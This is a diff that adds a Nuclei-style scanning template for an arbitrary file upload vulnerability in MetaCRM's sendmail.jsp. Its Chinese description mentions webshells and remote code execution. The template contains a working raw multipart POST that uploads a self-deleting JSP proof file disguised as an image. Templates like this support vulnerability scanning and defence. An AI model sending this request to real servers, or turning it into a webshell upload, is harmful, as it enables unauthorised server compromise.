@@ -1,0 +1,49 @@
+id: metasoft-crm-sendmail-fileupload
+info:
+  name: 美特CRM sendmail.jsp 文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: MetaCRM是一款智能平台化CRM软件,通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特CRM sendmail.jsp 接口存在任意文件上传漏洞，攻击者无需经过严格身份验证即可向服务器上传任意类型的文件，包括可执行的恶意脚本。一旦利用此漏洞，攻击者可能在服务器上部署后门、WebShell 等恶意程序，从而实现远程代码执行、服务器控制，甚至进一步窃取敏感数据或破坏业务系统的正常运行。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/nukhqfrywv0n4lku
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips: shellpath is in response body
+    repair:
+    version:
+  tags: fileupload,metasoft,crm
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /business/ums/sendmail.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept: */*
+        Connection: close
+        Content-Length: 280
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: image/jpeg
+
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'messageserv')
+        condition: and
